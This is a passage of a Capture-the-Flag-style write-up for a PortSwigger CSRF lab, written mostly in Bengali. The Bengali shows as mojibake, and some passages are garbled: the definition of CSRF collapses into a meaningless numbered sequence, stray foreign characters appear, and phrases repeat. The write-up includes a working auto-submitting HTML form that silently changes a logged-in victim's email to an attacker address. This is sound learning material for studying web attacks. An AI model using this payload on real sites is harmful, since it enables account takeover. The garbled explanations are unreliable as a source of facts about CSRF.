


 CSRF 

I solved one CSRF (Cross-Site Request Forgery) lyaab, which was provided by PortSwigger Web Security Academy.
ржПржЗ рж▓рзНржпрж╛ржмржЯрж┐ solve ржХрж░рж╛рж░ ржорж╛ржзрзНржпржорзЗ ржЖржорж┐ ржмрзБржЭрзЗржЫрж┐тАФCSRF ржХрзАржнрж╛ржмрзЗ ржХрж╛ржЬ ржХрж░рзЗ ржПржмржВ ржХрзЗржи ржПржЯрж╛ ржПржХржЯрж┐ ржЧрзБрж░рзБрждрж░ vulnerabilityред


ЁЯза CSRF ржХрзА?
CSRF ржПржоржи ржПржХржЯрж┐ ржжрзБрж░рзНржмрж▓рждрж╛, ржпрзЗржЦрж╛ржирзЗтАФ

тЗТ 1. 1 jataka 2. 1 malicious request 1. 2. 2. 3. 3. 4. 4. 5. 5. 6. 6. 7. 7. 7. 8. 8. 9. 9. 10. 10. 11. 11. 12. 12. 13. 13. 14. 14. 15. 15. 16. 16.
ЁЯСЙ ржХрж╛рж░ржг ржмрзНрж░рж╛ржЙржЬрж╛рж░ automaticржнрж╛ржмрзЗ cookie/session ржкрж╛ржарж╛рзЯ

ЁЯУМ ржПрждрзЗ attacker victim-ржПрж░ ржЕржирзБржорждрж┐ ржЫрж╛рзЬрж╛ржЗ action ржХрж░рж╛рждрзЗ ржкрж╛рж░рзЗред

ржЙржжрж╛рж╣рж░ржг:

Password change
Email change
Money transfer

ЁЯОп PortSwigger рж▓рзНржпрж╛ржмрзЗрж░ рж▓ржХрзНрж╖рзНржп
ржПржЗ рж▓рзНржпрж╛ржмрзЗрж░ рж▓ржХрзНрж╖рзНржп ржЫрж┐рж▓тАФ

Victim рж▓ржЧржЗржи ржЕржмрж╕рзНржерж╛рзЯ ржерж╛ржХрж▓рзЗ
CSRF defence ржПржХржЯрж┐ sensitive action ржХрж░рж╛.
Victim ржХрзЗ trick ржХрж░рзЗ request ржкрж╛ржарж╛ржирзЛ

ЁЯМР Vulnerable Function
ржПржЗ рж▓рзНржпрж╛ржмрзЗ ржЖржорж┐ ржжрзЗржЦрзЗржЫрж┐тАФ

Sensitive action Sensitive action (╫Ц╫Ф: email change)
Request ржП CSRF token ржирзЗржЗ
Server рж╢рзБржзрзБржорж╛рждрзНрж░ cookie/session ржПрж░ ржЙржкрж░ ржирж┐рж░рзНржнрж░ ржХрж░ржЫрзЗ
ЁЯУМ ржЙржжрж╛рж╣рж░ржг request:

POST /my-account/change-email


ЁЯФН ржЖржорж┐ ржпрзЗржнрж╛ржмрзЗ Vulnerability ржЦрзБржБржЬрзЗ ржкрзЗрзЯрзЗржЫрж┐
рззя╕ПтГг рж▓ржЧржЗржи ржХрж░рж╛рж░ ржкрж░ request observe
ржЖржорж┐ ржирж┐ржЬрзЗрж░ ржЕрзНржпрж╛ржХрж╛ржЙржирзНржЯрзЗ рж▓ржЧржЗржи ржХрж░рзЗ Burp Suite ржжрж┐рзЯрзЗ request ржжрзЗржЦрзЗржЫрж┐ред

POST /my-account/change-email
email=test@test.com

ЁЯУМ ржПржЦрж╛ржирзЗ ржХрзЛржирзЛ CSRF token ржЫрж┐рж▓ ржирж╛ред


рзия╕ПтГг Same request ржЕржирзНржп ржЬрж╛рзЯржЧрж╛ ржерзЗржХрзЗ ржкрж╛ржарж╛ржирзЛ рж╕ржорзНржнржм
ржЖржорж┐ рж▓ржХрзНрж╖рзНржп ржХрж░рзЗржЫрж┐тАФ

Request ржП рж╢рзБржзрзБржорж╛рждрзНрж░ session cookie рж▓рж╛ржЧрзЗ
Token ржмрж╛ origin validation ржирзЗржЗ
ржПрж░ ржорж╛ржирзЗ:
ЁЯСЙ ржЕржирзНржп ржУрзЯрзЗржмрж╕рж╛ржЗржЯ ржерзЗржХрзЗржУ request ржкрж╛ржарж╛ржирзЛ рж╕ржорзНржнржм


ЁЯзи ржЖржорж┐ ржпрзЗржнрж╛ржмрзЗ CSRF Exploit ржХрж░рзЗржЫрж┐
ржЖржорж┐ ржПржХржЯрж┐ simple HTML ржлрж╛ржЗрж▓ ржмрж╛ржирж┐рзЯрзЗржЫрж┐тАФ
<form method="POST" action="https://0a6b00ae0484048282cfa65c000d003e.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@email.com">
</form>
<script>
        document.forms[0].submit();
</script>


ЁЯУМ Victim ржпржжрж┐ рж▓ржЧржЗржи ржЕржмрж╕рзНржерж╛рзЯ ржПржЗ ржлрж╛ржЗрж▓ ржУржкрзЗржи ржХрж░рзЗтАФ

Request automatic ржкрж╛ржарж╛ржирзЛ рж╣рзЯ
Email change рж╣рзЯрзЗ ржпрж╛рзЯ
тЬЕ Lab solved

тЬНя╕П Written By
JISAN 
Cybersecurity Learner | Junior Penetration Tester.
Bangladesh ЁЯЗзЁЯЗй
